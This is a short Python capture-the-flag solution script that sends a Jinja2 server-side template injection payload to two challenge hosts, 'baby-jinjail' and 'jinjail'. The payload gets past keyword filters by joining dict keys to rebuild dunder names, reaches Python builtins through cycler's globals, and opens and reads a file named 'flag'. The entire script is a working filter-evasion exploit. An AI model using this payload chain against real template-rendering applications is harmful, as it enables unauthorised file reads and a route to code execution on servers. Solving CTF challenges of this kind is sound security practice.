import requests

url1 = 'http://baby-jinjail.chal.idek.team/'
url2 = 'http://jinjail.chal.idek.team/'

data = {"q":"{{(cycler|attr(dict(__ini=a,t__=b)|join)|attr(dict(__glob=c,als__=d)|join))[dict(__buil=buil,tins__=tins)|join][dict(op=op,en=en)|join](dict(fl=fl,ag=ag)|join)|attr(dict(re=re,ad=ad)|join)()}}"}
print("Flag baby-jinjail: ",requests.post(url1,data=data).text)
print("Flag jinjail: ",requests.post(url2,data=data).text)